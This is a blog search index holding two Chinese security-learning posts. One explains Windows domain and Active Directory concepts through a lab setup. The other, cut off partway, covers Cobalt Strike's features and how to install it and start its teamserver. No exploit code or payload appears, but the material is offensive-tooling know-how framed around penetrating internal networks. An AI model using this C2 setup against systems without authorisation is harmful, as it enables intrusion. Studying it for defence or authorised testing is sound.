<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>内网基础-域环境</title>
    <link href="/2023/10/27/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%9F%9F%E7%8E%AF%E5%A2%83/"/>
    <url>/2023/10/27/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%9F%9F%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><h2 id="1-域介绍"><a href="#1-域介绍" class="headerlink" title="1.域介绍"></a>1.域介绍</h2><p>​Windows域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。 </p><p>​域 (Domain)是一个有安全边界的计算机集合(安全边界的意思是,在两个域中,一个域中的用户无法 访问另一个域中的资源)可以简单地把域理解成升级版的工作组。与工作组相比,域的安全管理控制机制更加严格。用户要想访问域内的资源,必须以合法的身份登录域,而用户对域内的资源拥有什么样的权限,还取决于用户在域内的身份。 </p><p>​<strong>域控制器(Domain Controller,DC)<strong>是域中的一台类似</strong>管理服务器</strong>的计算机。域<strong>控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</strong>。当计算 机连接 到域时,域控制器首先要鉴别这台计算机是否属于这个域,以及用户使用的登录账号是否存在、密码是否正确。如果以上信息有一项不正确,域控制器就会拒绝这个用户通过这台计算机登录。如果用户不 能登录,就不能访问服务器中的资源。 </p><p>​<strong>域控制器是整个域的通信枢纽,所有的权限身份验证都在域控制器上进行,也就是说,域内所有用来验证身份的账号和密码散列值都保存在域控制器中。</strong></p><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>​通常,在一个地理位置固定的小公司里,建立一个域就可以满足需求。在一个域内,一般要有至少两台域服务器,一台作为DC,另一台作为备份DC</p><img src="/img/image-20230831203239480.png" alt="image-20230831203239480" style="zoom:50%;" /><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>​出于管理及其他需求,需要在网络中划分多个域。<strong>第一个域称为父域,各分部的域称为该域的子域</strong>。例如大公司的各个分公司位于不同的地点,就需要使用父域及子域。如果把不同地点的分公司放在同一 个域内,那么它们之间在信息交互(包括同步、复制等)上花费的时间就会比较长,占用的带宽也会比较大(在同一个域内,信息交互的条目是很多的,而且不会压缩; 在不同的域之间,信息交互的条日相对较少, 而且可以压缩)。这样处理有一个好处,就是分公司可以通过自己的域来管理自己的资源。还有一种情况是出于安全策略的考虑(每个域都有自己的 安全策略)例如,一个公司的财务部希望使用特定的安全策略(包括账号密码策略等)、那么可以将财务部作为一个子域来单独管理。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>​<strong>域树(Tree)是多个域通过建立信任关系组成的集合</strong>。一个域管理员只能管理本域,不能访问或者管理其他域。<strong>如果两个域之间需要互相访问,则需要建立信任关系</strong>，信任关系是连接不同域的桥梁。域树内的父域与子域,不但可以按照需要互相管理、还可以跨网络分配文件和打印机等设备及资源,从而在 不同的域之间实现网络资源的共享与管理、通信及数据传输</p><p>​在一个域树中,父域可以包含多个子域。子域是相对父域来说的,指的是域名中的每一个段。 各子域之间用点号隔开,一个”.”代表一个层次。放在域名最后的子域称为最高级子域或一级域,它前面的子域为二级域</p><img src="/img/image-20230831203501528.png" alt="image-20230831203501528" style="zoom:50%;" /><h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>​<strong>域森林( Forest)是指多个域树通过建立信任关系组成的集合</strong>。</p><p>​例如,在一个公司兼并场景中某公司使 用域树 abc. com,被兼并的公司本来有自己的域树abc. net, 域树abc.net无法挂在域树abc.com下。 所以,域树abc.com与域树 abc. net之间需要通过建立信任关系来构成域森林。通过域树之间的信任 关系,可以管理和使用整个域森林中的资源,并保留被兼并公司自身原有的特性</p><p><img src="/img/image-20230831203609752.png" alt="image-20230831203609752"></p><h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>​域名服务器(Domain Name Server,DNs)是指用于实现域名( Domain Name)和与之相对的IP地址( IP Address)转换的服务器。从对域树的介绍中可以看出,域树中的域名和DNS域名非常相似。而实际上,因为域中的计算机是使用DNS来定位域控制器、服务器及其他计算机、网络服务的,所以域的名字就是DNS域的名字。在内网渗透测试中,大都是通过寻找DNS服务器来确定域控制器的位置的(<strong>DNS 服务器和域控制器通常配置在同一机器上</strong>)</p><h2 id="2-域环境搭建"><a href="#2-域环境搭建" class="headerlink" title="2.域环境搭建"></a>2.域环境搭建</h2><table><thead><tr><th>机器</th><th>ip</th></tr></thead><tbody><tr><td>WindowsServer 2012 R2（域控）</td><td>10.210.100.10（静态）</td></tr><tr><td>WindowsServer 2008 R2（域内主机）</td><td>10.210.100.20（可设置为静态 也可动态）</td></tr><tr><td>WindowsServer 2003 R2（域内主机）</td><td>10.210.100.30</td></tr></tbody></table><h3 id="winserver2012配置"><a href="#winserver2012配置" class="headerlink" title="winserver2012配置"></a>winserver2012配置</h3><h4 id="1-修改为静态ip"><a href="#1-修改为静态ip" class="headerlink" title="1.修改为静态ip"></a>1.修改为静态ip</h4><img src="/img/image-20231001152825110.png" alt="image-20231001152825110" style="zoom: 50%;" /><img src="/img/image-20231001152922249.png" alt="image-20231001152922249" style="zoom:67%;" /><h4 id="2-更改计算机名为DC"><a href="#2-更改计算机名为DC" class="headerlink" title="2.更改计算机名为DC"></a>2.更改计算机名为DC</h4><img src="/img/image-20231001153131681.png" alt="image-20231001153131681" style="zoom:50%;" /><h4 id="3-安装域控制器和DNS服务"><a href="#3-安装域控制器和DNS服务" class="headerlink" title="3.安装域控制器和DNS服务"></a>3.安装域控制器和DNS服务</h4><p>单击【添加角色和功能】选项,进入添加角色和功能向导界面。在【开始之前】部分, 本保持默认设置。单击下一步按钮,进入【安装类型】部分,选择基于角色或者基于功能的 安装选项。单击下一步按 钮,进入【服务器选择】部分。目前,在服务器池中只有当前这 台机器,保持默认设置。单击下一步按 钮,在【服务器角色】部分勾选【 Active Directory域 服务】和【DNS服务器】复选框</p><img src="/img/image-20231001154041453.png" alt="image-20231001154041453" style="zoom: 50%;" /><p>在”功能”界面保持默认设置,单击”下一步”按钮,进人”确认”部分。确认需要安装的组件,勾选”如果需 要,自动重新启动目标服务器”复选框,,然后单击”安装” 按钮</p><img src="/img/image-20231001154324378.png" alt="image-20231001154324378" style="zoom: 50%;" /><h4 id="4-升级服务器"><a href="#4-升级服务器" class="headerlink" title="4.升级服务器"></a>4.升级服务器</h4><img src="/img/image-20231001154549952.png" alt="image-20231001154549952" style="zoom:50%;" /><img src="/img/image-20231001154708915.png" alt="image-20231001154708915" style="zoom:50%;" /><p>在【域控制器选项】部分,将林功能级别、域功能级别都设置为” WindowsServer2012R2”,创建域林 时,在默认情况下应选择DNS服务器,林中的第一个域控制器必须是全局目录服务器且不能是只读域控 制器(RODC)。然后,设置目录服务还原模式的密码(在开机 进入安全模式修复活动目录数据库时将使用此密码</p><img src="/img/image-20231001154942973.png" alt="image-20231001154942973" style="zoom:50%;" /><p>在【DNS选项】部分会出现关于DNS的警告。不用理会该警告,保持默认设置。单击”下一步”按钮,进入”其他选项”部分。在”NetBIOS域名”(不支持DNS域名的旧版本操作系统,例如Windows98、NT,需 要通过NetBIOs域名进行通信)部分保持默认设置。单击”下一步”按钮,进人”路径”部分,指定数据库、 日志、SYSVOL文件夹的位置,其他选项保持默认设置。单击”下一步”按钮,保持默认设置。单击”下一 步”按钮,最后单击”安装按钮。安装后,需要重新启动服务器，最后升级为域控</p><img src="/img/image-20231001155107024.png" alt="image-20231001155107024" style="zoom:50%;" /><p>检查通过 安装即可</p><img src="/img/image-20231001155158361.png" alt="image-20231001155158361" style="zoom:50%;" /><p>安装完成后会重启计算机  设置成功后会新增一些管理工具</p><img src="/img/image-20231001160052275.png" alt="image-20231001160052275" style="zoom:67%;" /><h4 id="5-创建用户"><a href="#5-创建用户" class="headerlink" title="5.创建用户"></a>5.创建用户</h4><p>点击AD用户和计算机管理 来到hack.com–&gt;Users–&gt;右键新建用户</p><img src="/img/image-20231001160531301.png" alt="image-20231001160531301" style="zoom:67%;" /><p>设置密码永不过期</p><img src="/img/image-20231001160647259.png" alt="image-20231001160647259" style="zoom:50%;" /><img src="/img/image-20231001160742122.png" alt="image-20231001160742122" style="zoom:50%;" /><h3 id="将机器winserver2008加入域"><a href="#将机器winserver2008加入域" class="headerlink" title="将机器winserver2008加入域"></a>将机器winserver2008加入域</h3><p>配置为静态ip10.210.100.20   设置DNS服务器地址为winserver2012</p><img src="/img/image-20231001161300878.png" alt="image-20231001161300878" style="zoom:67%;" /><img src="/img/image-20231001161404912.png" alt="image-20231001161404912" style="zoom:67%;" /><p>更改计算机名  加入域hack.com</p><img src="/img/image-20231001161538871.png" alt="image-20231001161538871" style="zoom:67%;" /><p>验证：需要输入<strong>域控的管理员账号密码</strong></p><img src="/img/image-20231001161814606.png" alt="image-20231001161814606" style="zoom:67%;" /><img src="/img/image-20231001161855732.png" alt="image-20231001161855732" style="zoom:80%;" /><p>重启即可 此时2008可通过两种方式登录</p><p>方式1：本地administrator用户</p><img src="/img/image-20231001162159736.png" alt="image-20231001162159736" style="zoom:67%;" /><p><img src="/img/image-20231001162423605.png" alt="image-20231001162423605"></p><p>方式2：切换用户  使用DC中新建的用户jack登录</p><p><img src="/img/image-20231001162315013.png" alt="image-20231001162315013"></p><h2 id="3-活动目录-Active-Directory-AD"><a href="#3-活动目录-Active-Directory-AD" class="headerlink" title="3.活动目录(Active Directory,AD)"></a>3.活动目录(Active Directory,AD)</h2><p>活动目录( Active Directory,AD)是指域环境中提供目录服务的组件 </p><p>目录<strong>用于存储有关网络对象(例如用户、组、计算机、共享资源、打印机和联系人等)的信息</strong>。</p><p>目录服务是指帮助用户快速、准确地从目录中找到其所需要的信息的服务。活动目录实现了目录服务,为企业提供了网络环境的集中式管理机制活动目录的逻辑结构包括前面讲过的组织单元(OU)、域、域树、域森林。域树内的所有域共享一个活动目录,这个活动目录内的数据分散存储在各个域中,且每个域只存储该域内的数据</p><p>活动目录主要提供以下功能 ：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">1.账号集中管理:所有账号均存储在服务器中,以便执行命令和重置密码等。 </span><br><span class="hljs-section">2.软件集中管理:统一推送软件、安装网络打印机等。利用软件发布策略分发软件,可以让 用户自由选择需要安装的软件。 3.环境集中管理:统一客户端桌面、IE、TCPP协议等设置。 </span><br><span class="hljs-section">4.增强安全性:统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定用户密码策略等。可以监控网络,对资料进行统一管理。 </span><br><span class="hljs-section">5.更可靠,更短的宕机时间:例如,利用活动目录控制用户访问权限,利用群集、负载均衡等技术对文件服务器进行容灾设置。网络更可靠,宕机时间更短。 </span><br>6.活动目录是微软提供的统一管理基础平台,ISA、 Exchange、SMS等都依赖这个平台<br></code></pre></td></tr></table></figure><p>管理工具–AD用户和计算机</p><ul><li>Builtin 管理安全组</li></ul><img src="/img/image-20231001164501632.png" alt="image-20231001164501632" style="zoom:50%;" /><ul><li>Computers  加入域的计算机</li></ul><img src="/img/image-20231001164639417.png" alt="image-20231001164639417" style="zoom:67%;" /><ul><li>Domain Controller 域控</li></ul><img src="/img/image-20231001164817074.png" alt="image-20231001164817074" style="zoom:67%;" /><ul><li>Users  存放用户信息</li></ul><img src="/img/image-20231001164905511.png" alt="image-20231001164905511" style="zoom:67%;" /><p>例：</p><p>1.添加用户到域管理员组</p><p>右键添加到组–&gt;选择Domain Admins</p><img src="/img/image-20231001165310525.png" alt="image-20231001165310525" style="zoom: 67%;" /><img src="/img/image-20231001165342146.png" alt="image-20231001165342146" style="zoom:67%;" /><p>2.新建用户+新建组+添加用户到组</p><p>Users–&gt;右键新建 用户–&gt;设置密码</p><img src="/img/image-20231001165450445.png" alt="image-20231001165450445" style="zoom:50%;" /><p><img src="/img/image-20231001165659717.png" alt="image-20231001165659717"></p><p>Users–&gt;右键新建组</p><img src="/img/image-20231001165821695.png" alt="image-20231001165821695" style="zoom:50%;" /><p><img src="/img/image-20231001165836766.png" alt="image-20231001165836766"></p><p>右键用户添加到组</p><img src="/img/image-20231001165934194.png" alt="image-20231001165934194" style="zoom:50%;" /><h3 id="组织单元"><a href="#组织单元" class="headerlink" title="组织单元"></a>组织单元</h3><p>组织单元（OU）是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源，是一个容器，可以在OU上部署组策略</p><p>组织单元是域中包含的一类目录对象如用户、计算机和组、文件与打印机等资源。是一个容器。组织单元还具有分层结构可用来建立域的分层结构模型，进而可使用户把网络所需的域的数量减至最小</p><p>例如AD中的各个文件夹可以称为一个组织单元</p><img src="/img/image-20231001170618314.png" alt="image-20231001170618314" style="zoom:67%;" /><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><table><thead><tr><th>部门</th><th>人数</th></tr></thead><tbody><tr><td>财务部门</td><td>20</td></tr><tr><td>人事部门</td><td>10</td></tr><tr><td>IT部门</td><td>100</td></tr><tr><td>网络管理员</td><td>3</td></tr></tbody></table><p>1.创建组织单元</p><p>hack.com–&gt;右键新建组织单位</p><img src="/img/image-20231001171223217.png" alt="image-20231001171223217" style="zoom: 67%;" /><img src="/img/image-20231001171403713.png" alt="image-20231001171403713" style="zoom:50%;" /><p>2.在部门中新建用户</p><img src="/img/image-20231001171523193.png" alt="image-20231001171523193" style="zoom:50%;" /><img src="/img/image-20231001171647451.png" alt="image-20231001171647451" style="zoom:67%;" /><p>其余同理  组织单元下可再建组织单元</p><img src="/img/image-20231001171924903.png" alt="image-20231001171924903" style="zoom:67%;" /><h3 id="委派控制"><a href="#委派控制" class="headerlink" title="委派控制"></a>委派控制</h3><p>因为财务部门有20个人，不能有问题就去找网络管理员，需要委派控制权限给财务部门一个代表， 让他去执行，也就是说在财务部门找一个代表，他由相应的权限去管理财务部门的计算机和用户</p><img src="/img/image-20231001173300045.png" alt="image-20231001173300045" style="zoom: 67%;" /><img src="/img/image-20231001173332052.png" alt="image-20231001173332052" style="zoom:50%;" /><p>选择委派的权限：</p><img src="/img/image-20231001173354874.png" alt="image-20231001173354874" style="zoom:50%;" /><h2 id="4-域中的权限划分和基本思想"><a href="#4-域中的权限划分和基本思想" class="headerlink" title="4.域中的权限划分和基本思想"></a>4.域中的权限划分和基本思想</h2><h3 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h3><p>域本地组成员<strong>来自林中任何域中的用户账户、全局组和通用组以及本域中的域本地组</strong>，在<strong>本域范围</strong>内<br>可用。</p><h3 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h3><p>全局组成员<strong>来自于同一域的用户账户和全局组</strong>，在<strong>全林范围</strong>内可用</p><h3 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h3><p>通用组成员<strong>来自林中任何域中的用户账户、全局组和其他的通用组</strong>，在<strong>全林范围</strong>内可用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">域本地组来自全林,作用于本域;<br>全局组来自本域,作用于全林;<br>通用组来自全林,作用于全林。<br></code></pre></td></tr></table></figure><h3 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h3><p>有一个打印机连接域控，设置域本地组赋予使用打印机的权限，然后设置全局组，将人员都加入到全<br>局组，然后将全局组加入到域本地组就可以了</p><img src="/img/image-20231001175136519.png" alt="image-20231001175136519" style="zoom: 33%;" /><h3 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h3><p>有三个域hack.com(在北京)，sh.hack.com(在上海)，gz.hack.com(在广州)组成W林，然后北京财<br>务部门，需要进行结算，但是数据在北京的一台服务器上权限比较高只有北京财务人员可以使用，同<br>时因为北京人数不够，需要上海和广州支援，这个时候怎么办？<br>1、只需要在北京的建立一个域本地组，然后赋予域本地组权限可以访问财务的数据机器<br>2、在上海和广州分别建立全局组<br>3、在北京的域控上将上海和广州的全局组加入进来</p><img src="/img/image-20231001175612770.png" alt="image-20231001175612770" style="zoom: 33%;" /><h3 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h3><p>A-G-DL-P策略是指将用户账号添加到全局组（将其当作一个集合，不给权限）中,将全局组添加到域本地组中,然后为域本地组分配资源权限</p><p>A表示用户账号( Account) </p><p>G表示全局组( Global Group) </p><p>U表示通用组( Universal Group) </p><p>DL表示域本地组( Domain Local Group) </p><p>P表示资源权限( Permission,许可)</p><h3 id="重要的域本地组"><a href="#重要的域本地组" class="headerlink" title="重要的域本地组"></a>重要的域本地组</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">• 管理员组(Administrators)的成员可以不受限制地存取计算机/域的资源。它不仅是最具权力的一个组,也是在活动目录和域控制器中默认具有管理员权限的组。该组的成员可以更改 Enterprise Admins、<span class="hljs-keyword">Schema</span> admins和<span class="hljs-keyword">Domain</span> admins组的成员关系,是域森林中强大的 服务管理组 <br>• 远程登录组(Remote Desktop Users)的成员具有远程登录权限。 <br>• 打印机操作员组( Print Operators)的成员可以管理网络打印机,包括建立、管理及删除网 络打印机, 并可以在本地登录和关闭域控制器。 <br>• 账号操作员组(Account Operators)的成员可以创建和管理该域中的用户和组并为其设置权 限,也 可以在本地登录域控制器,但是,不能更改属于 Administrators或 <span class="hljs-keyword">Domain</span> admins组 的账户,也不能 修改这些组。在默认情况下,该组中没有成员。 <br>• 服务器操作员组(<span class="hljs-keyword">Server</span> Operators)的成员可以管理域服务器,其权限包括建立管理删除 任意服务 器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘 锁定服务器、变更服 务器的系统时间、关闭域控制器等。在默认情况下,该组中没有成员。 <br>• 备份操作员组(Backup Operators)的成员可以在域控制器中执行备份和还原操作,并可以 在本地登 录和关闭域控制器。在默认情况下,该组中没有成员 <br>• 再介绍几个重要的全局组、通用组的权限。 <br>• 域管理员组(<span class="hljs-keyword">Domain</span> Admins)的成员在所有加入域的服务器(工作站)、域控制器和活动 目录中均 默认拥有完整的管理员权限。因为该组会被添加到自己所在域的Administrators 组中,因此可以继 承 Administrators组的所有权限。同时,该组默认会被添加到每台域成员 计算机的本地Administrators组中,这样, <span class="hljs-keyword">Domain</span> admins组就获得了域中所有计算机的所 有权。如果希望某用户 成为域系统管理员,建议将该用户添加到 <span class="hljs-keyword">Domain</span> admins组中,而 不要直接将该用户添加到Administrators组中。 <br>• 企业系统管理员组(Enterprise Admins)是域森林根域中的一个组。该组在域森林中的每个 域内都 是 Administrators组的成员,因此对所有域控制器都有完全访问权。 <br>• 架构管理员组(<span class="hljs-keyword">Schema</span> admins)是域森林根域中的一个组,可以修改活动目录和域森林的 模式。该 组是为活动目录和域控制器提供完整权限的域用户组,因此,该组成员的资格是 非常重要的。 <br>• 域用户组(<span class="hljs-keyword">Domain</span> users)中是所有的域成员。在默认情况下,任何由我们建立的用户账号 都属于<span class="hljs-keyword">Domain</span> Users组,而任何由我们建立的计算机账号都属于<span class="hljs-keyword">Domain</span> Computers组。因 此,如果想让 所有的账号都获得某种资源存取权限,可以将该权限指定给域用户组,或者 让域用户组属于具有该权限 的组。域用户组默认是内置域 Users组的成员<br></code></pre></td></tr></table></figure><h2 id="5-安全域划分"><a href="#5-安全域划分" class="headerlink" title="5.安全域划分"></a>5.安全域划分</h2><p>​划分安全域的目的是<strong>将一组安全等级相同的计算机划入同一个网段</strong>。这个网段内的计算机拥 有相同的网络边界,并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略 ，从而对允许哪些IP地址访问此域、允许此域访问哪些IP地址和网段进行设置。这些措施,将使得网络风险最小化, 当攻击发生时,可以尽可能地将威胁隔离,从而降低对域内计算机的影响。</p><p><img src="/img/image-20231001180302998.png" alt="image-20231001180302998"></p><p>在一个用路由器连接的内网中,可以将网络划分为三个区域: </p><p>安全级别最高的内网; </p><p>安全级别中等的DMZ; </p><p>安全级别最低的外网 </p><p>在配置一个拥有DMZ的网络时,通常需要定义如下访问控制策略,以实现其屏障功能。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">内网可以访问外网:内网用户需要自由地访问外网。在这一策略中,防火墙需要执行NAT。</span><br><span class="hljs-section">内网可以访问DMZ:此策略使内网用户可以使用或者管理DMZ中的服务器</span><br><span class="hljs-section">外网不能访问内网:这是防火墙的基本策略。内网中存储的是公司内部数据,显然,这些数据一般是不允许外网用户访问的(如果要访问,就要通过VPN的方式来进行)</span><br><span class="hljs-section">外网可以访问DMZ:因为DMZ中的服务器需要为外界提供服务,所以外网必须可以访问DMZ。同时,需要由防火墙来完成从对外地址到服务器实际地址的转换。</span><br><span class="hljs-section">DMZ不能访问内网:如果不执行此策略,当攻击者攻陷DMZ时,内网将无法受到保护</span><br><span class="hljs-section">DMZ不能访问外网:此策略也有例外。例如,在DMZ中放置了邮件服务器,就要允许访问外网,否则邮件服务器无法正常工作</span><br></code></pre></td></tr></table></figure><p>办公区:公司员工日常的工作区,一般会安装防病毒软件、主机入侵检测产品等。</p><p>办公区一般能够访问DMZ。如果运维人员也在办公区,那么部分主机也能访问核心数据区(很多企业还会使用堡垒机来统一 管理用户的登录行为)攻击者如果想进入内网,一艘会使用鱼叉攻击、水坑攻击,当然还有社会工程学手段。</p><p>核心区:存储企业最重要的数据、文档等信息资产,通过日志记录、安全审计等安全措施进行严密的保护,往往只有很少的主机能够访问。</p><p>从外部是绝难直接访问核心区的。一般来说,能够直接访问核心区的只有运维人员或者IT部门的主管,所以,攻击者会重点关注这些用户的信息(攻击者在内网中进行横向 移动攻击时,会优先查找这些主机</p><h2 id="6-域中计算机的分类"><a href="#6-域中计算机的分类" class="headerlink" title="6.域中计算机的分类"></a>6.域中计算机的分类</h2><p>域中计算机的分类在域结构的网络中,计算机的身份是不平等的,有域控制器、成员服务器、客户机、 独立服务器四种类型。 </p><p>1、域控制器 （内网渗透目标）</p><p><strong>域控制器用于管理所有的网络访问,包括登录服务器、访问共享目录和资源</strong>。域控制器中存储了域内所有的账户和策略信息,包括安全策略、用户身份验证信息和账户信息。 </p><p>在网络中,可以有多台计算机被配置为域控制器,以分拒用广的登录、访问等操作。多个域控制器可以一起工作,自动备份用户账户和活动目录数据。这样,即使部分域控制器瘫痪,网络访问也不会受到影响,提高了网络的安全性和稳定性 </p><p>2、成员服务器 </p><p><strong>成员服务器是指安装了服务器操作系统并加入了域、但没有安装活动目录的计算机</strong>,其主要任务是提供网络资源。成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等  例如win2008Server等</p><p>3、客户机 </p><p>域中的计算机可以是安装了其他操作系统的计算机,用户利用这些计算机和域中的账户就可以登录域。这些计算机被称为域中的客户机。域用户账号通过域的安全验证后,即可访间网络中的各种资源。 </p><p>4、独立服务器 </p><p><strong>独立服务器和域没有关系</strong>。如果服务器既不加入域,也不安装活动目录,就称其为独立服务器。独立服务器可以创建工作组、与网络屮的其他计算机共享资源,但不能使用活动目录提供的任何服务 域控制器用于冇放活动目录数据库,是域屮必须要有的,而其他三种计算机则不是必须要有的，也就是说,最简单的域可以只包含</p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CS基础操作</title>
    <link href="/2023/10/27/CS%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/10/27/CS%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Cobalt-Strike的特点"><a href="#1-Cobalt-Strike的特点" class="headerlink" title="1 Cobalt Strike的特点"></a>1 Cobalt Strike的特点</h1><p>Cobalt Strike简称CS 用于团队作战使用，由一个服务端和多个客户端组成，<strong>能让多个攻击者这在一个团队服务器上共享目标资源和信息</strong></p><p>CS有很多Payload的生成模块 可以生成EXE，dll，vbs，图片马，bad，vba宏，和shellcode等等</p><p>CS还支持钓鱼攻击，可自动化挂马链接生成</p><p>CS还有很多后渗透模块，浏览器代理模块，端口转发 扫描，提权，socks代理 ，令牌窃取等</p><p>Cobalt Strike 分为服务端和客户端</p><p>服务端 可以部署在远程服务器下或者 部署在kali里</p><p>客户端 可以部署到本地  支持linux和windows系统</p><p><img src="/img/75b6e43ff3704734b9159eb6d869f2fb-1695967963040-46.png" alt="16478585820453010889ffy"></p><h1 id="2-Cobalt-Strike-安装与环境配置（kali）"><a href="#2-Cobalt-Strike-安装与环境配置（kali）" class="headerlink" title="2 Cobalt Strike 安装与环境配置（kali）"></a>2 Cobalt Strike 安装与环境配置（kali）</h1><p>准备环境 ：</p><p>CS4.4</p><p>jdk11（如果使用kali 则不需要另外安装jdk）</p><h2 id="2-1-其他linux系统安装jdk"><a href="#2-1-其他linux系统安装jdk" class="headerlink" title="2.1 其他linux系统安装jdk"></a>2.1 其他linux系统安装jdk</h2><p>使用 APT 安装 OpenJDK 11：</p><h4 id="1-升级APT"><a href="#1-升级APT" class="headerlink" title="1 升级APT"></a>1 升级APT</h4><p>sudo apt-get update</p><p>或</p><p>apt-get update</p><h4 id="2-使用-APT-安装-OpenJDK-11："><a href="#2-使用-APT-安装-OpenJDK-11：" class="headerlink" title="2 使用 APT 安装 OpenJDK 11："></a>2 使用 APT 安装 OpenJDK 11：</h4><p>sudo apt-get install openjdk-11-jdk</p><p>或</p><p>apt-get install openjdk-11-jdk</p><h4 id="3-将-OpenJDK-11-设置为默认-Java-程序："><a href="#3-将-OpenJDK-11-设置为默认-Java-程序：" class="headerlink" title="3 将 OpenJDK 11 设置为默认 Java 程序："></a>3 将 OpenJDK 11 设置为默认 Java 程序：</h4><p>sudo update-java-alternatives -s java-1.11.0-openjdk-amd64</p><p>或</p><p>update-java-alternatives -s java-1.11.0-openjdk-amd64</p><h2 id="2-2-开始安装"><a href="#2-2-开始安装" class="headerlink" title="2.2 开始安装"></a>2.2 开始安装</h2><p>Cobalt Strike 4.4 安装包</p><p><img src="/img/14891048f1a443189271648fb648ac83.png" alt="image.png">将CS4.4解压</p><p><img src="/img/f306b313bbb943a3a531743cf850d3c9.png" alt="image.png"></p><p>创建一个目录去存解压文件</p><p><img src="/img/0cc03d13fb46410e94bd9b42cd284a75.png" alt="image.png"></p><p><img src="/img/12c18a80417e40b4966cbefa5b838500.png" alt="image.png"></p><p>给服务的启动文件赋 777权限</p><p>进入终端找到CS4目录  然后 chmod 777 teamserver   （注意我这边是使用root终端操作的）</p><p><img src="/img/e18bba4c407d46499c610877916e6c78.png" alt="image.png"></p><p>完成环境配置</p><h1 id="3-Cobalt-Strike-安装与环境配置（Windows）"><a href="#3-Cobalt-Strike-安装与环境配置（Windows）" class="headerlink" title="3 Cobalt Strike 安装与环境配置（Windows）"></a>3 Cobalt Strike 安装与环境配置（Windows）</h1><h2 id="3-1-下载Windows-x64-OpenJDK：https-jdk-java-net-archive"><a href="#3-1-下载Windows-x64-OpenJDK：https-jdk-java-net-archive" class="headerlink" title="3.1 下载Windows x64 OpenJDK：https://jdk.java.net/archive/"></a>3.1 下载Windows x64 OpenJDK：<a href="https://jdk.java.net/archive/">https://jdk.java.net/archive/</a></h2><p><img src="/img/e682edc55ca341858951eba606500e93.png" alt="image.png"></p><p>然后解压并找个位置放这个  jdk-11.0.1  注意路径最好不要有中文。</p><p><img src="/img/image-20230929141211993-1695967963041-47.png" alt="image-20230929141211993"></p><p>我这边把jdk-11.0.1放到E盘根目录</p><h2 id="3-2-环境变量配置"><a href="#3-2-环境变量配置" class="headerlink" title="3.2 环境变量配置"></a>3.2 环境变量配置</h2><p><img src="/img/image-20231027095058244.png" alt="image-20231027095058244"></p><p><img src="/img/7d99f50064ff44a6a04548edc978fb5a.png" alt="image.png"></p><p>进入CMD  输入  java -version</p><p><img src="/img/image-20231027095113394.png" alt="image-20231027095113394"></p><h1 id="4-Cobalt-Strike团队服务器启动"><a href="#4-Cobalt-Strike团队服务器启动" class="headerlink" title="4 Cobalt Strike团队服务器启动"></a>4 Cobalt Strike团队服务器启动</h1><p>打开root终端进入CS 目录</p><p>在终端中输入： .&#x2F;teamserver 192.168.3.56 123456</p><p>解释</p><p><img src="/img/17e33ff4bb0541c5ab5330227eaa2a6b.png" alt="image.png"></p><p>看到这个提示证明已经启动完成</p><p><img src="/img/2265b42b4b3042a2bd5731c7a93fdc3a.png" alt="image.png"></p><p>到此CS服务器启动完成了</p><h1 id="5-Cobalt-Strike客户端连接到团队服务（Linux）"><a href="#5-Cobalt-Strike客户端连接到团队服务（Linux）" class="headerlink" title="5 Cobalt Strike客户端连接到团队服务（Linux）"></a>5 Cobalt 